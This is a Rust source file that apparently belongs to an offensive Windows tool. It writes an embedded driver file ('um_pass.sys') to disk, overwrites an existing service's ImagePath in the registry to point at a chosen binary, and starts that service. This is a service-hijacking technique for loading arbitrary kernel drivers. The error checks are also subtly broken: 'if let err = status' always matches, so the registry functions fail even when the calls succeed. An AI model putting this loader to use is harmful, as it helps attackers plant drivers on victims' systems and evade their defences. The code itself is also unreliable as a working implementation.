use std::fs::File;
use std::io::Write;
use std::path::Path;
use std::ffi::OsStr;
use std::iter::once;
use std::os::windows::ffi::OsStrExt;

use windows::{
    core::PCWSTR,
    Win32::System::Services::{
        OpenSCManagerW, OpenServiceW, StartServiceW, CloseServiceHandle,
        SC_MANAGER_CONNECT, SERVICE_START, SERVICE_QUERY_STATUS,
    },
    Win32::System::Registry::{
        RegOpenKeyExW, RegSetValueExW, RegCloseKey,
        HKEY, HKEY_LOCAL_MACHINE, KEY_SET_VALUE, REG_SZ,
    },
};

/// Writes the driver to disk if needed from a byte stream
pub fn write_embedded_file(path: &str) -> std::io::Result<()> {
    // Embed the file at compile time
    // TKTK - this needs to be in src/um_pass.sys!!!
    let data: &[u8] = include_bytes!("um_pass.sys");

    let mut file = File::create(Path::new(path))?;
    file.write_all(data)?;
    Ok(())
}

/// Modifies a specific service to point to a certain binary path
pub fn modify_svc_reg(svc_name: &str, bin_path: &str) -> windows::core::Result<()> {
    unsafe {
        // Build registry path: SYSTEM\CurrentControlSet\Services\<svc_name>
        let reg_path = format!("SYSTEM\\CurrentControlSet\\Services\\{}", svc_name);
        let reg_path_w: Vec<u16> = OsStr::new(&reg_path).encode_wide().chain(once(0)).collect();

        let mut hkey: HKEY = HKEY(std::ptr::null_mut());

        // Open key with write access
        let status = RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            PCWSTR(reg_path_w.as_ptr()),
            0,
            KEY_SET_VALUE,
            &mut hkey,
        );

        if let err = status {
            eprintln!("[-] RegOpenKeyExW failed: {:?}", err);
            return Err(err.into());
        }

        let data: Vec<u8> = bin_path
            .encode_utf16()
            .chain(Some(0)) // null terminator
            .flat_map(|u| u.to_le_bytes()) // convert u16 -> [u8; 2]
            .collect();

        // Create wide string for "ImagePath"
        let key_name_w: Vec<u16> = OsStr::new("ImagePath").encode_wide().chain(once(0)).collect();
        let status = RegSetValueExW(
            hkey,
            PCWSTR(key_name_w.as_ptr()),
            0,
            REG_SZ,
            Some(&data),
        );

        // Close key handle
        let _ = RegCloseKey(hkey);

        if let err = status {
            eprintln!("[-] RegSetValueExW failed: {:?}", err);
            return Err(err.into());
        }

        Ok(())
    }
}

pub fn start_svc(svc_name: &str) -> windows::core::Result<()> {
    unsafe {
        // Open handle to Service Control Manager
        let scm_handle = OpenSCManagerW(
            PCWSTR::null(), // local machine
            PCWSTR::null(), // ServicesActive database
            SC_MANAGER_CONNECT,
        )?;

        // Convert service name to wide string
        let svc_name_w: Vec<u16> = svc_name.encode_utf16().chain(std::iter::once(0)).collect();

        // Open handle to the service
        let svc_handle = OpenServiceW(
            scm_handle,
            PCWSTR(svc_name_w.as_ptr()),
            SERVICE_START | SERVICE_QUERY_STATUS,
        )?;

        // Start the service
        StartServiceW(svc_handle, None)?;

        // Clean up handles
        let _ = CloseServiceHandle(svc_handle);
        let _ = CloseServiceHandle(scm_handle);

        Ok(())
    }
}
